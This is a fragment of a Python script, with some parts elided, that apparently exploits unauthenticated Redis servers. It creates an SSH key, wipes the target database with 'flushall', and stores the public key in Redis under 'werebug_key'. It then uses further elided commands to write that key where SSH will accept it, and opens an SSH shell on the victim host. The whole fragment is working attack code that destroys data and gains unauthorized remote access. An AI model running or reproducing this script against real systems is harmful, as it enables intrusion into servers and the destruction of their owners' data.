...
def ssh_connection():
	shell = "ssh -i " + '$HOME/.ssh/id_rsa_postman_redis ' + username+"@"+ip_address
	os.system(shell)
...
if os.path.isfile(PATH) or os.path.isfile(PATH1):
	try:
		...
		os.system('ssh-keygen -t rsa -f /root/.ssh/id_rsa_postman_redis -C \"werebug\"')
		print colored("\t Keys Generated Successfully", "blue")
		os.system("(echo '\r\n\'; cat $HOME/.ssh/id_rsa_postman_redis.pub; echo  \'\r\n\') > $HOME/.ssh/public_key.txt")
		cmd = "redis-cli -h " + ip_address + ' flushall'
		cmd1 = "redis-cli -h " + ip_address
		os.system(cmd)
		cmd2 = "cat $HOME/.ssh/public_key.txt | redis-cli -h " +  ip_address + ' -x set werebug_key'
		os.system(cmd2)
		...
		os.system(cmd5)
		os.system(cmd6)
		print colored("\tYou'll get shell in some time... Thanks for your patience.", "green")
		ssh_connection()
